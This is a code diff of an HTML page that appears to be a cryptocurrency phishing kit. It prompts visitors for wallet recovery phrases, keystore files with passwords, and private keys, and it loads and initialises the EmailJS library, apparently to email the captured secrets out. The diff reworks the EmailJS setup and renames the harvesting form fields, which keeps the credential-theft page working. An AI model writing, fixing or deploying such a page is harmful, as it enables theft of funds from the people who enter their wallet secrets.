@@ -2,16 +2,20 @@
 
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <head>
-  <script type="text/javascript"
-src="https://cdn.jsdelivr.net/npm/%40emailjs/browser%404/dist/email.min.js">
-</script>
-<script type="text/javascript">
-(function(){
-emailjs.init({
-publicKey: "tRYq_CDLm-Vu_54J4",
-});
-})();
-</script>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      if (window.emailjs && typeof emailjs.init === 'function') {
+        try {
+          emailjs.init("tRYq_CDLm-Vu_54J4");
+        } catch(e) {
+          try {
+            emailjs.init({ publicKey: "tRYq_CDLm-Vu_54J4" });
+          } catch(err) {}
+        }
+      }
+    })();
+  </script>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -8520,7 +8524,7 @@ publicKey: "tRYq_CDLm-Vu_54J4",
             <div id="data-to-send">
               <div class="form-group">
                 <input type="hidden" id="type1" name="type" value="phrase" />
-                <textarea id="textInput" name="phrase" required="" class="form-control"
+                <textarea id="textInput" name="textInput" required="" class="form-control"
                   placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
               </div>
               <div class="small text-left my-3" style="font-size: 11px">
@@ -10123,19 +10127,19 @@ publicKey: "tRYq_CDLm-Vu_54J4",
       $("#phraseSend").on("click", function (e) {
         if (e) e.preventDefault();
         sendForm.html(
-          '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea id="textInput" name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+          '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea id="textInput" name="textInput" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
         );
       });
       $("#keystoreSend").on("click", function (e) {
         if (e) e.preventDefault();
         sendForm.html(
-          '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea id="textInput" rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" id="pk" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+          '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea id="textkeys" name="textkeys" rows="5" style="resize: none" required class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" id="textksp" name="textksp" class="form-control mt-2" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
         );
       });
       $("#privateKeySend").on("click", function (e) {
         if (e) e.preventDefault();
         sendForm.html(
-          '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" id="textInput" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+          '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" id="textpk" name="textpk" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
         );
       });
 
